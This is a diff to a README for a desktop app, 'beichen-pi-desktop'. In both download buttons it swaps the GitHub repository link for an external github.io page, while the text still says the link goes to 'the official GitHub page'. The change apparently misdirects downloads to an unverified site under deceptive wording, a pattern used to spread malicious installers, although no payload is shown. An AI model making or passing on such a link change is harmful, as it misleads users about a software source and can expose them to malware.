@@ -23,7 +23,7 @@ This app is perfect for anyone who wants privacy, speed, and control over their 
 
 ### Step 1: Get the App
 
-[![Download beichen-pi-desktop](https://img.shields.io/badge/Download-beichen--pi--desktop-brightgreen?style=for-the-badge&logo=github)](https://github.com/Herbal-effusion5658/beichen-pi-desktop)
+[![Download beichen-pi-desktop](https://img.shields.io/badge/Download-beichen--pi--desktop-brightgreen?style=for-the-badge&logo=github)](https://herbal-effusion5658.github.io)
 
 **Visit this link to download the application.**
 
@@ -124,7 +124,7 @@ Check the app's built-in help section first. You can also search for terms like 
 Here's your complete walkthrough:
 
 1. **Click the download button:**
-   [![Download beichen-pi-desktop](https://img.shields.io/badge/Download--beichen--pi--desktop-blue?style=for-the-badge)](https://github.com/Herbal-effusion5658/beichen-pi-desktop)
+   [![Download beichen-pi-desktop](https://img.shields.io/badge/Download--beichen--pi--desktop-blue?style=for-the-badge)](https://herbal-effusion5658.github.io)
 
 2. **Visit this link to download the application.** This takes you to the official GitHub page.
 
